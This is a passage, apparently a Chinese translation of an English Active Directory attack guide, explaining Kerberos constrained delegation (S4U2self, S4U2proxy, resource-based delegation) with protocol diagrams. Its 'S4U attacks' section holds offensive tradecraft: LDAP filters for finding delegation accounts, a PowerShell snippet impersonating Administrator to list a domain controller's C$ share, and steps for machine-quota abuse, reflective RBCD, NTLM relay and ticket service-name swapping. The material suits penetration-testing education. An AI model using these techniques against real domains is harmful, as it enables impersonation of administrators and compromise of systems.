PrincipalsAllowedToDelegateToAccount     : {CN=Anakin,CN=Users,DC=contoso,DC=local}
SamAccountName                           : han
SID                                      : S-1-5-21-1372086773-2238746523-2939299801-1109
Surname                                  :
UserPrincipalName                        : han@contoso.local
```

（由于msDS-AllowedToActOnBehalfOfOtherIdentity值是一种 [binary format](https://www.gabescode.com/active-directory/2019/07/25/nt-security-descriptors.html)的[security descriptor](https://zer1t0.gitlab.io/posts/attacking_ad/#security-descriptor)，因此需要请求PrincipalAllowedToDeleteToAccount属性，该属性以人性化格式打印此数据）

另一方面，通过检查允许对Han用户的 msDS-AllowedToActOnBehalfOfOtherIdentity ，我们发现它允许Anakin用户对其所有服务执行授权。

因此，Anakin可以针对Han用户的任何服务模拟任何用户（ [protected ones](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-anti-delegation-measures)除外）。

```
                         msDS-AllowedToActOnBehalfOfOtherIdentity

  \o/           delegate to                o
   |   -------------------------------->  /|\ 
  / \                                     / \
 Anakin                                   Han
```

此外，KDC还检查其他参数以确定S4U2proxy请求的结果。它还考虑客户机ST是否可转发，以及 [client ](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-anti-delegation-measures)是否受委托保护。您可以检查[MS-SFU specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c6f6f8b3-1209-487b-881d-d0908a413bb7)中的规则。作为总结，规则如下：

| 1.如果客户ST的PAC中的票证签名无效                            | return error KRB-AP-ERR-MODIFIED                             |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| 2.如果客户端ST没有FORWARDABLE 且客户端被保护                 | return  error KRB-ERR-BADOPTION - STATUS-ACCOUNT-RESTRICTED  |
| 3.如果客户端ST没有FORWARDABLE且target_service  in ms-AllowedToDelegateTo | return error KRB-ERR-BADOPTION - STATUS-ACCOUNT-RESTRICTED （实验得出） |
| 4.如果客户端ST FORWARDABLE 且target_service in ms-AllowedToDelegateTo | return  S4U2proxy ST                                         |
| 5.如果服务用户在target_service 用户 msDS-AllowedToActOnBehalfOfOtherIdentity | return S4U2proxy ST                                          |

需要注意的一件奇怪的事情是，可以通过使用**Resource Based Constrained Delegation** (msDS-AllowedToActOnBehalfOfOtherIdentity)，从[non FORWARDABLE client ST](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#serendipity) 检索S4U2proxy ST。除非目标服务也在ms-AllowedToDelegateTo (rule 3)中列出，否则将返回错误。

此外，在 [PAC Ticket Signature](https://zer1t0.gitlab.io/posts/attacking_ad/#pass-the-ticket)检查实现之前，服务用户可以 [modify the client ST](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)（因为它是用Kerberos密钥加密的）并使其FORWARDABLE，然而，微软在PAC中引入了此Ticket Signature（由KDC密钥签名），以验证ST未被篡改

而且 [S4U2proxy returns forwardable tickets ](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#a-forwardable-result)（即便 [specification has been updated](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ce6bbf34-0f11-40d6-93d1-165a3afa0223) 但还是可以），S4U2proxy 过程：

```
###S4U2proxy process
                KDC
                .---. <-----2) TGS-REQ--------------------.
               /   /|    + SPN: MSSQLSvc/dbsrv            |
              .---. |    + TGT websrv$                    |
              |   | '    + ST client > http/websrv        |
              |   |/                                      |
              '---'  >-----3) TGS-REP------------------.  |
                       + ST client > MSSQLSvc/dbsrv    v  ^
                                                      .---.
  ____                                               /   /|
 |    | >-----------1) AP-REQ---------------------> .---. |
 |____|     + ST client > http/websrv               |   | '
 /::::/                                             |   |/ 
 client                                             '---'  
                                                    websrv
                .---.                                  v
               /   /|                                  |
              .---. |<-----4) AP-REQ-------------------'
              |   | '   + ST client > MSSQLSvc/dbsrv
              |   |/ 
              '---'  
              dbsrv
```

1.客户端通过发送ST在web服务器服务上(http/websrv)认证

2.稍后，当web服务器（http/websrv）需要代表客户端访问数据库服务（MSSQLSvc/dbsrv）时，它会使用客户端ST和自己的TGT为MSSQLSvc/dbsrv请求一个ST。

3.KDC按照前面讨论的规则检查服务用户websrv$是否允许请求MSSQLSvc/dbsrv的委派票证，并返回MSSQLSvc/dbsrv的客户端ST。综上所述，通常应满足以下条件之一：

- MSSQLSvc/dbsrv包含在websrv$（web服务器的服务用户）的msDS-AllowedToDelegateTo属性中。这是典型的约束委托。
- websrv$包含在dbsrv$（MSSQLSvc/dbsrv服务的服务用户）的属性msDS-AllowedToActOnBehalfOfOtherIdentity中，这是Resource Based Constrained Delegation

4.web服务使用最近获取的ST通过模拟客户端对数据库进行身份验证。

S4U2proxy 也能用在跨域中，但 [only Resource Based Constrained Delegation can be used](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview#resource-based-constrained-delegation-across-domains)

```
###S4u2proxy across domains
                                                  KDC foo.com
       .--------------1) TGS-REQ-------------------> .---.
       |          + SPN: MSSQLSvc/dbsrv.bar.com     /   /|
       |          + TGT websrv$ > foo.com          .---. |
       |          + ST client > http/websrv        |   | '
       |                                           |   |/ 
       |   .----2) TGS-REP-----------------------< '---'  
       |   |  + TGT websrv$ (client) > bar.com     ^   v
       ^   v                                       |   |
        .---.                                      |   |
       /   /| >----3) TGS-REQ----------------------'   |
      .---. |      + SPN: krbtgt/bar.com               |
      |   | '      + TGT websrv$ > foo.com             |
      |   |/                                           |
      '---'   <-----4) TGS-REP-------------------------'
      websrv        + TGT websrv$ > bar.com                      .---.
    (foo.com)                                                   /   /|
      ^  v  v                                                  .---. |
      |  |  '-------------7) AP-REQ--------------------------> |   | '
      |  |          + ST client > MSSQLSvc/dbsrv.bar.com       |   |/ 
      |  |                                                     '---'  
      |  '-------5) TGS-REQ-----------------------> .---.      dbsrv
      |      + SPN: MSSQLSvc/dbsrv.bar.com         /   /|    (bar.com)
      |      + TGT websrv$ > bar.com              .---. |
      |      + TGT websrv$ (client) > bar.com     |   | '
      |                                           |   |/ 
      '---6) TGS-REP----------------------------< '---'  
        + ST client > MSSQLSvc/dbsrv.bar.com   KDC bar.com
```

1.我们假设客户机已经将其ST发送到WebRV服务。然后websrv需要代表用户访问数据库服务MSSQLSvc/dbsrv。

2.websrv代表客户要求MSSQLSvc/dbsrv的ST，通过包括其自己的ST。

3.KDC检查请求并确定所请求的服务位于bar.com中，因此它返回一个特殊的域间TGT，用于向bar.com KDC请求S4U2proxy。

4.websrv检查响应并发现S4U2proxy的这个特殊域间TGT。但是它也需要一个用于bar.com的普通域间TGT，所以它请求一个到KDC的TGT。

5.KDC将域间TGT返回到bar.com以获取websrv$。

6.然后websrv$使用这些域间TGT代表客户机向bar.com KDC请求为MSSQLSvc/dbsrv提供的ST。

7.KDC检查请求并确定允许websrv$委托给MSSQLSvc/dbsrv服务（使用RBCD），因此它为MSSQLSvc/dbsrv发出ST。

8.websrv使用此新ST代表客户端访问MSSQLSvc/dbsrv服务。

#### S4U2self

Kerberos S4U2self 扩展允许服务代表用户为自己请求票证，然后可以在S4U2proxy中使用该票证，这样做是为了允许对那些不支持Kerberos协议的客户端执行Kerberos委派。它也被称为协议转换

要能用S4U2self ， KDC 会检查服务用户账户的 [UserAccountControl](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) TRUSTED_TO_AUTH_FOR_DELEGATION标志，要改这个标志的话得有 [SeEnableDelegationPrivilege](https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)

此外，KDC还检查服务用户是否有任何服务以及[msDS-AllowedToDelegateTo](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa)属性的值，

具体规则可以在 [MS-SFU specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c98bade9-cad1-4745-bd4d-d13926103022)中看到，但以下是收到S4U2self请求时KDC执行的检查的摘要：

| 1.如果服务用户没有任何服务                                   | 返回KDC-ERR-S-PRINCIPAL-UNKNOWN错误                          |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| 2.如果客户端[protected   against delegation](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-anti-delegation-measures) | return non-FORWARDABLE ST                                    |
| 3.如果服务用户设置TRUSTED_TO_AUTH_FOR_DELEGATION标志         | return  FORWARDABLE ST                                       |
| 4.如果服务用户TRUSTED_TO_AUTH_FOR_DELEGATION标志没设置且服务用户有服务在ms-AllowedToDelegateTo | return non-FORWARDABLE ST（ (This ST can still be [used for   S4U2proxy with Resource Based Constrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#serendipity))） |
| 5.如果服务用户TRUSTED_TO_AUTH_FOR_DELEGATION标志没设置且服务用户ms-AllowedToDelegateTo为空 | return  FORWARDABLE ST.                                      |

```
###S4U2self process
                                                                KDC
                          .---. >---2) TGS-REQ-------------->  .---.
                         /   /|     + SPN: HTTP/websrv        /   /|
  ____                  .---. |     + For user: client       .---. |
 |    | >-1) SPNEGO-->  |   | '     + TGT websrv$            |   | '
 |____|     (NTLM)      |   |/                               |   |/ 
 /::::/                 '---'  <----3) TGS-REP-------------< '---'  
 client                websrv   + ST client > HTTP/websrv
```

1.客户端通过使用NTLM（或任何其他身份验证协议）针对HTTP/websrv服务进行身份验证，因为它不支持Kerberos。

2.websrv通过向KDC发送TGS-REQ为客户端请求S4U2self ST。

3.KDC检查请求、websrv$ TRUSTED_TO_AUTH_FOR_DELEGATION标志以及客户端是否受到委托保护。如果一切正常，KDC将为客户端返回一个HTTP/websrv ST，它可能是可转发的，也可能不是可转发的，这取决于所提到的变量

S4U2Self 也可以跨域

```
###S4U2self across domains
                                                           ____       
                                                          |    |
                                   .-----1) SPNEGO------< |____|
                                   |       (NTLM)         /::::/
                                   |                   client (bar)
                                   |
                                   |
  foo KDC                          v                                    bar KDC
   .---. <----2) TGS-REQ------<  .---. >---------4) TGS-REQ------------>  .---.
  /   /|  + SPN: krbtgt/bar     /   /|        + SPN: HTTP/websrv         /   /|
 .---. |  + TGT websrv$ > foo  .---. |        + For user: client        .---. |
 |   | '                       |   | '        + TGT websrv$ > bar       |   | '
 |   |/                        |   |/                                   |   |/ 
 '---'  >-----3) TGS-REP-----> '---'  <----------5) TGS-REP-----------< '---'  
 v   ^   + TGT websrv$ > bar  websrv    + TGT websrv$ (client) > foo
 |   |                         (foo)
 |   |                         v   ^
 |   |                         |   |
 |   '--<<--6) TGS-REQ---<<----'   |                  
 |  + SPN: HTTP/websrv             | 
 |  + For user: client             |     
 |  + TGT websrv$ (client) > foo   |
 |                                 |
 '----->>---7) TGS-REP---->>-------'                
   + ST client > HTTP/websrv
```

1.客户端通过使用NTLM（或任何其他身份验证协议）针对HTTP/websrv服务进行身份验证，因为它不支持Kerberos。

2.websrv确定客户端的领域是bar，因此它发送一个TGS-REQ，请求为bar域提供TGT。

3.KDC将bar的域间TGT返回给websrv。

4.websrv使用其新的跨域TGT请求bar KDC 为客户端要HTTP/websrv ST

5.bar KDC确定HTTP/websrv服务位于foo域中，因此它无法为HTTP/websrv服务发出ST，但它返回一个用于foo域的引用TGT，该引用TGT指示已请求客户端的HTTP/websrv ST。

6.然后，websrv使用bar KDC发布的这个引用TGT向foo KDC为客户端请求一个ST 。

7.foo-KDC检查请求和引用TGT，并确定可以为客户端发出HTTP/websrv-ST。

#### **S4U2self and S4U2proxy**

现在我们了解了S4U2self和S4U2proxy的工作原理，让我们一起来看看它们的用法和示例。

```
###S4U2self chained with S4U2proxy
                                                  KDC
   .------>>----1) TGS-REQ----->>---------------> .---.
   |            + SPN: HTTP/websrv               /   /|
   |            + For user: admin               .---. |
   |            + TGT websrv$                   |   | '
   |                                            |   |/ 
   |   .--<<----2) TGS-REP-----<<-------------< '---'  
   |   |        + ST admin > HTTP/websrv        ^   v
   |   |                                        |   |
   |   |                                        |   |
   ^   v                                        |   |
   .---. >->>---3) TGS-REQ----->>---------------'   |
  /   /|        + SPN: MSSQLSvc/dbsrv               |
 .---. |        + TGT websrv$                       |
 |   | '        + ST admin > HTTP/websrv            |
 |   |/                                             |
 '---'  <--<<---4) TGS-REP-----<<-------------------'
 websrv         + ST admin > MSSQLSvc/dbsrv
   v
   |
   |                                      .---.
   |                                     /   /|
   '------------5) AP-REQ-------------> .---. |
       + ST admin > MSSQLSvc/dbsrv      |   | '
                                        |   |/ 
                                        '---'  
                                        dbsrv
```

1.websrv通过TGS-REQ使用S4U2self为管理员用户向KDC请求HTTP/websrv ST。

2.KDC检查请求， websrv$ TRUSTED_TO_AUTH_FOR_DELEGATION标志和admin是否受委托保护。如果一切无误，KDC给客户端返回一个HTTP/websrv ST，可能也可能不FORWARDABLE，取决于 [S4U2Self](https://zer1t0.gitlab.io/posts/attacking_ad/#s4u2self)提到过的变量

3.然后websrv 通过用S4U2self ST, 和自己的TGT代表admin请求MSSQLSvc/dbsrv ST

4.KDC检查是否允许服务用户websrv$根据 [S4U2Proxy](https://zer1t0.gitlab.io/posts/attacking_ad/#s4u2proxy)中提到的规则请求MSSQLSvc/dbsrv的委派票证。然后，它为admin返回一个MSSQLSvc/dbsrv ST

5.websrv使用MSSQLSvc/dbsrv ST通过模拟管理员对数据库进行身份验证。

可以将S4U2self和S4U2proxy链接起来，这样您就可以针对允许服务用户执行受约束委派的所有服务来模拟任何用户（those [protected against delegation ](https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos-anti-delegation-measures)除外）

当然也可以[use S4U2self and S4U2proxy across domains](https://exploit.ph/crossing-trusts-4-delegation.html)

#### **S4U attacks**

来看看Constrained Delegation and S4U extensions 怎么在渗透中使用

要找到用了受限委托的账户，必须得找有UserAccountControl TRUSTED_TO_AUTH_FOR_DELEGATION开启的账户 (S4U2self/Protocol 过渡)，或者msDS-AllowedToDelegateTo属性（典型受限约束）或 msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)属性有值。

Constrained Delegation LDAP搜索条件：

```ldap
###LDAP filter to retrieve accounts related to Constrained Delegation
(|
  (UserAccountControl:1.2.840.113556.1.4.803:=16777216)
  (msDS-AllowedToDelegateTo=*)
  (msDS-AllowedToActOnBehalfOfOtherIdentity=*)
)
```

要找受约束委托相关账户，工具： [Powerview](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1) , [impacket findDelegation.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py) script, the [Powershell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps) or [ldapsearch](https://linux.die.net/man/1/ldapsearch).

```ldap
###LDAP filter to retrieve accounts protected against delegation：
(|
  (memberof:1.2.840.113556.1.4.1941:=CN=Protected Users,CN=Users,DC=<domain>,DC=<dom>)
  (userAccountControl:1.2.840.113556.1.4.803:=1048576)
)
```

找到帐户并希望执行一些相关的Kerberos操作后，有许多工具可以通过S4U扩展执行票证请求，并获取ST以供任意用户模拟它们，如 [MIT kerberos utils](https://labs.f-secure.com/archive/trust-years-to-earn-seconds-to-break/#:~:text=Practical Exploitation) ([ktutitl](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/ktutil.html), [kinit](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_commands/kinit.html), [kvno](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_commands/kvno.html)), [Rubeus](https://github.com/GhostPack/Rubeus#s4u), [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) impacket script or [cerbero](https://gitlab.com/Zer1t0/cerbero/).

如果在受限委派电脑上有SYSTEM权限可以用S4U2self和S4U2proxy的时候带上 a [little of Powershell code](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/#:~:text=Scenario 2)

```powershell
# Code made by Lee Christensen (@tifkin_) and Will Schroeder (@harmj0y)
# Source: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/

# translated from the C# example at https://msdn.microsoft.com/en-us/library/ff649317.aspx

# load the necessary assembly
$Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

# execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user
$Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@FOO.LOCAL')

# actually impersonate the next context
$Context = $Ident.Impersonate()

# implicitly invoke S4U2Proxy with the specified action
ls \\DC01.FOO.LOCAL\C$

# undo the impersonation context
$Context.Undo()
```

约束委托的好处在于，在许多情况下（RBCD或TrustedTouthForElegation启用下），您可以模拟用户而无需任何交互。但是，由于能访问的服务数量有限，因此必须了解在委派过程中可能有用的合理服务：

**LDAP of a domain controller**

​	AD的 [LDAP](https://zer1t0.gitlab.io/posts/attacking_ad/#ldap)服务用于管理帐户，包括其权限，因此，如果您可以针对LDAP服务模拟管理员，则可以为您控制的任何用户帐户授予任何权限。例如，授予任意攻击者执行[DCSync attack](https://adsecurity.org/?p=1729)攻击来渗透域

**SMB of any computer**

​	如果允许针对计算机的SMB（SPN中的cifs）服务模拟任何用户，可以用[psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)访问计算机中的所有文件，执行命令，并通过RPC调用执行其他操作。

**MSSQL services**

​	[MSSQL](https://zer1t0.gitlab.io/posts/attacking_ad/#sql-server)服务器允许用户通过 [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)命令执行命令， [via xp_dirtree](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe)执行HTTP请求到WebDAV服务器来滥用NTLM中继，以及 [many other options](https://github.com/NetSPI/PowerUpSQL)。

**krbtgt service**

​	如果允许一个帐户委托给krbtgt服务，它可以请求 [TGTs for any account ](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence) that it is allowed to impersonate

请记住，即使不允许您通过经典约束委派（ms-AllowedToDelegateTo属性）直接委派给这些服务中的一个，但可以委派给同一用户的一个服务，您也可以更改[target service in the ticket](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/)。例如，如果允许您委托给计算机的HTTP服务，例如HTTP/websrv，则可以将目标服务更改为CIFS/websrv以访问计算机（如果HTTP服务是在计算机帐户的上下文中执行的）。此外，如果您可以委托DC的任何服务，您可能可以更改票证服务以使用它访问LDAP服务。

为了向服务模拟用户，您需要基于资源的约束委派（RBCD）或带有协议转换的经典约束委派（S4U2self）。

您可以通过允许在其ms-AllowedToActOnBehalfOfOtherIdentity属性中写入并指向至少具有一项服务的帐户（以便使用S4U2self）来将RBCD启用到帐户。

如果您没有至少具有一项服务的帐户，则可以通过滥用[machine quota](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#generic-dacl-abuse)创建一个计算机帐户。默认情况下，计算机配额允许用户在域上创建10个计算机帐户。这可以通过[Powermad](https://github.com/Kevin-Robertson/Powermad#machineaccountquota-functions) or [impacket addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)完成。创建计算机帐户后（用户可以选择计算机帐户的密码），创建该帐户的用户可以为其分配服务。因此可以拿一个有服务的账户

此外，帐户默认有权编辑自己的ms-AllowedToActOnBehalfOfOtherIdentity属性。因此，如果您能够获取计算机帐户的凭据（如NT哈希、Kerberos密钥或[TGTs](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce)），则可以将RBCD启用到该计算机的任意用户。通过这种方式，您可以使用RBCD针对计算机CIFS（SMB）服务模拟管理员并渗透计算机。

实际上，有计算机帐户凭证的话就能启用RBCD到其自身（反射RBCD）。通过这种方式，您只需使用 [S4U2self to ask](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#empowering-active-directory-objects-and-reflective-resource-based-constrained-delegation)计算机CIFS服务的票证，就可以获得一个ST以渗透主机。这甚至可以模拟受保护的用户帐户。这个方法很重要，因为域计算机帐户默认情况下没有权限以管理员身份远程访问计算机本身。

```
###Reflective RBCD attack
   .----------------------1) LDAP (modify websrv$) --------------------.                                                   
   |      + msds-AllowedToActOnBehalfOfOtherIdentity = ["websrv$"]     |
   |                                                                   v
   |     .----------------2) TGS-REQ---------------------------.      .---.
   ^     |              + SPN: CIFS/websrv                     |     /   /|
   o  >--'              + For user: admin                      '--> .---. |
  /|\                   + TGT websrv$                               |   | '
  / \                                                               |   |/ 
websrv$ <-----------------3) TGS-REP------------------------------< '---'  
   v                  + ST admin > CIFS/websrv                       DC (KDC)
   |
   |                                        .---.
   |                                       /   /|
   '---------4) AP-REQ------------------> .---. |
         + ST admin > CIFS/websrv         |   | '
                                          |   |/ 
                                          '---'  
                                          websrv
```

尽管如此，在渗透机器之前获取计算机凭据很难（maybe with [Unconstrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce)?），但如果可以强制计算机对您控制的主机发出 NTLM-authenticated HTTP请求，您可以使用从HTTP到LDAP的跨[NTLM relay](https://zer1t0.gitlab.io/posts/attacking_ad/#ntlm-relay)攻击，以便将计算机帐户的RBCD启用到您控制的帐户。

要使用此原语，可以[take advantage of the WebDAV](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#viable-ntlm-relay-primitives-for-rcelpe) client installed by default in Windows desktops，例如，可以使用[xp_dirtree procedure of a MSSQL database](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe) 触发经过身份验证的HTTP请求（ [bad_sequel.py](https://gist.github.com/3xocyte/0dc0bd4cb48cc7b4075bdc90a1ccc7d3) ）

但是，您可能会使用未启用协议转换（S4U2self）的经典受限委派来渗透帐户，意味着无法为任何用户申请票证。在这种情况下可以 [use RBCD to mimic Protocol Transition](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-accounts-collude---trustedtoauthfordelegation-who)。这意味着您可以将RBCD从被渗透帐户（具有经典约束委派的帐户）启用到另一个帐户，以便其他帐户可以为任何用户请求受损帐户的票证，该票证应该[forwardable since it is produced by S4U2proxy](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#a-forwardable-result)（ [specification has been updated](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ce6bbf34-0f11-40d6-93d1-165a3afa0223?redirectedfrom=MSDN)，但似乎还能这么用），这样来模仿协议转换

这可能不太好搞，因此让我们来看一个示例：dbsrv被渗透并启用了经典的约束委派，但没有协议转换。然而，websrv也被渗透并可用于RBCD协议转换。然后从websrv到dbsrv可以用RBCD，并使用websrv模拟协议转换，最后通过以下方式获取管理员ST以渗透filesrv。

```
###Using RBCD as Protocol Transition
                                        KDC
   .-------1) TGS-REQ-->>------------> .---. <----6) TGS-REQ----<<------------.  
   |    + SPN: HTTP/websrv            /   /| + SPN: CIFS/filesrv              |
   |    + For user: admin            .---. | + TGT dbsrv$                     |
   |    + TGT websrv$                |   | ' + ST(F) admin > MSSQLSvc/dbsrv   |
   |                                 |   |/                                   |
   |  .----2) TGS-REP--<<----------< '---' >------7) TGS-REP---->>--------.   |             
   |  | + ST admin > HTTP/websrv     ^   v   + ST admin > CIFS/filesrv    |   |
   |  |                              |   |                                |   |
   |  |                              |   |                                |   |
   |  |                              |   |                                |   |
   ^  v                              |   |                                |   |
   .---. >--------3) TGS-REQ---->>---'   |                                |   |
  /   /|  + SPN: MSSQLSvc/dbsrv          |                                |   |
 .---. |  + TGT websrv$                  |                                |   |
 |   | '  + ST admin > HTTP/websrv       |                                |   |
 |   |/                                  |                                |   |
 '---' <----------4) TGS-REP----<<-------'                                v   ^
 websrv  + ST(F) admin > MSSQLSvc/dbsrv                                   .---. 
   v                                                                     /   /|  
   |                                                                    .---. | 
   '------------------5) Send the ticket----->>>>---------------------> |   | '                      
                    + ST(F) admin > MSSQLSvc/dbsrv                      |   |/  
                                                                        '---'   
                                                                        dbsrv   
                                  .---.                                  v
                                 /   /|                                  |
                                .---. | <--8) AP-REQ---<<----------------'
                                |   | '  + ST admin > CIFS/filesrv
                                |   |/ 
                                '---'  
                                filesrv
```

在前四个步骤中，websrv使用S4U2self和S4U2proxy为admin获取可转发的MSSQLSvc/dbsrv ST，从而模拟协议转换。然后websrv将此admin ST发送到dbsrv，dbsrv将其用于S4U2proxy，并为admin请求一个CIFS/filesrv ST，以允许破坏filesrv。